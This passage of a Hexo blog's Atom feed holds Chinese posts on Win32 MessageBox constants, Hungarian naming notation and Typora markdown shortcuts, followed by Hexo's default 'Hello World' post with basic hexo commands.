title="思考"></a>思考</h4></li></ul><p>在<code>MB_OK</code>处转到定义：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MB_OK                       0x00000000L</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MB_OKCANCEL                 0x00000001L</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MB_ABORTRETRYIGNORE         0x00000002L</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MB_YESNOCANCEL              0x00000003L</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MB_YESNO                    0x00000004L</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MB_RETRYCANCEL              0x00000005L</span></span><br></pre></td></tr></table></figure><p>对应关系 ：MB_OK 对应十六进制的0？</p><p>用 1 来替换 MB_OK 一样可以得到结果吗？</p><p>bingo！</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">MessageBox(<span class="literal">NULL</span>, </span><br><span class="line">        TEXT(<span class="string">"this is content !"</span>),</span><br><span class="line">               TEXT(<span class="string">"this is title !"</span>),</span><br><span class="line">               <span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>编译通过！</p><hr><h4 id="2-匈牙利命名法"><a href="#2-匈牙利命名法" class="headerlink" title="2.匈牙利命名法"></a>2.匈牙利命名法</h4><p>对于上面MessageBox函数中奇奇怪怪的参数，它们使用了匈牙利命名法。</p><p>  这种标记法非常简单，即变量名以一个或者多个小写字母开始，这些字母表示变量的数据型态。例如：szCmdLine 中的 sz 代表“以0结尾的字符串（StringZero）”；在 hInstance 和 hPrevInstance 中的 h 前缀表示“句柄（Handle）”；在 iCmdShow 中的 i 前缀表示“整型（Integer）”。</p><p>当命名结构变量时，可以用结构名（或者结构名的一种缩写）的小写形式作为变量名称的前缀，或者用作整个变量名。例如：msg 变量是 MSG 型态的结构；wndclass 是 WNDCLASSEX 型态的一个结构；ps 是一个 PAINTSTRUCT 结构，rect 是一个 RECT 结构。</p><p>匈牙利表示法能够帮助程序写作者及早发现并避免程序中的错误。由于变量名既描述了变量的作用，又描述了其数据型态，就比较容易避免产生数据型态不合的错误。</p><table><thead><tr><th><strong>前缀</strong></th><th><strong>数据类型</strong></th></tr></thead><tbody><tr><td>i</td><td>int（整型）</td></tr><tr><td>c</td><td>char 或 WCHAR 或 TCHAR</td></tr><tr><td>by</td><td>BYTE （无符号字符）</td></tr><tr><td>x, y</td><td>int，表示 x 坐标和 y 坐标</td></tr><tr><td>l</td><td>LONG（长整型）</td></tr><tr><td>B 或 f</td><td>BOOL（int）；f 表示“flag”</td></tr><tr><td>w</td><td>WORD（无符号短整型）</td></tr><tr><td>dw</td><td>DWORD（无符号长整型）</td></tr><tr><td>fn</td><td>函数</td></tr><tr><td>s</td><td>字符串</td></tr><tr><td>sz</td><td>以零结束的字符串</td></tr><tr><td>h</td><td>句柄</td></tr><tr><td>p</td><td>指针</td></tr><tr><td>cx, cy</td><td>int，表示 x 或 y 的长度，c 表示“count”（计数）</td></tr></tbody></table>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;windows编程随笔&quot;&gt;&lt;a href=&quot;#windows编程随笔&quot; class=&quot;headerlink&quot; title=&quot;windows编程随笔&quot;&gt;&lt;/a&gt;&lt;center&gt;windows编程随笔&lt;/center&gt;&lt;/h3&gt;&lt;hr&gt;
&lt;h4 id=&quot;1-从Mess
      
    
    </summary>
    
    
      <category term="windows" scheme="http://yoursite.com/tags/windows/"/>
    
  </entry>
  
  <entry>
    <title>my first blog</title>
    <link href="http://yoursite.com/2019/07/28/my-first-blog/"/>
    <id>http://yoursite.com/2019/07/28/my-first-blog/</id>
    <published>2019-07-27T17:15:07.000Z</published>
    <updated>2019-07-29T00:38:58.224Z</updated>
    
    <content type="html"><![CDATA[<h3 id="第一个博客"><a href="#第一个博客" class="headerlink" title="第一个博客"></a><center>第一个博客</center></h3><hr><p>第一个博客，简单记录一下markdown的快捷键吧</p><hr><h4 id="Typora快捷键"><a href="#Typora快捷键" class="headerlink" title="Typora快捷键"></a>Typora快捷键</h4><ul><li><h5 id="选中"><a href="#选中" class="headerlink" title="选中"></a>选中</h5></li></ul><p>选中一整行：ctrl+l<br>选中单词：ctrl+d<br>选中相同格式的文字：ctrl+e</p><ul><li><h5 id="跳转"><a href="#跳转" class="headerlink" title="跳转"></a>跳转</h5></li></ul><p>跳转到文章开头：ctrl+home<br>跳转到文章结尾：ctrl+end</p><ul><li><h5 id="搜索"><a href="#搜索" class="headerlink" title="搜索"></a>搜索</h5></li></ul><p>搜索：ctrl+f<br>替换：ctrl+h</p><ul><li><h5 id="输入格式"><a href="#输入格式" class="headerlink" title="输入格式"></a>输入格式</h5></li></ul><p>引用：输入&gt;之后输入空格<br>代码块：ctrl+alt+f；```+语言<br>标题：ctrl+数字<br>表格：ctrl+t<br>生成目录：[TOC]按回车<br>插入标注：输入[]，后面+任何<br>插入图片：直接拖动到指定位置即可或者ctrl+shift+i<br>插入链接：ctrl+k<br>插入表情：输入’:’之后输入英文单词<br>无序列表：输入-之后输入空格<br>有序列表：输入数字+“.”之后输入空格<br>todolist：-[空格]空格 文字</p><ul><li><h5 id="显示格式"><a href="#显示格式" class="headerlink" title="显示格式"></a>显示格式</h5></li></ul><p>加粗：ctrl+b<br>高亮：== 文字 ==<br>着重：ctrl+shift+反引号键（tab键上面那个键）<br>倾斜：ctrl+i<br>下划线：ctrl+u</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;第一个博客&quot;&gt;&lt;a href=&quot;#第一个博客&quot; class=&quot;headerlink&quot; title=&quot;第一个博客&quot;&gt;&lt;/a&gt;&lt;center&gt;第一个博客&lt;/center&gt;&lt;/h3&gt;&lt;hr&gt;
&lt;p&gt;第一个博客，简单记录一下markdown的快捷键吧&lt;/p&gt;
&lt;hr&gt;
&lt;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="http://yoursite.com/2019/07/28/hello-world/"/>
    <id>http://yoursite.com/2019/07/28/hello-world/</id>
    <published>2019-07-27T16:29:39.537Z</published>
    <updated>2019-07-27T16:29:39.537Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.
      
    
    </summary>
    
    
  </entry>
  
</feed>
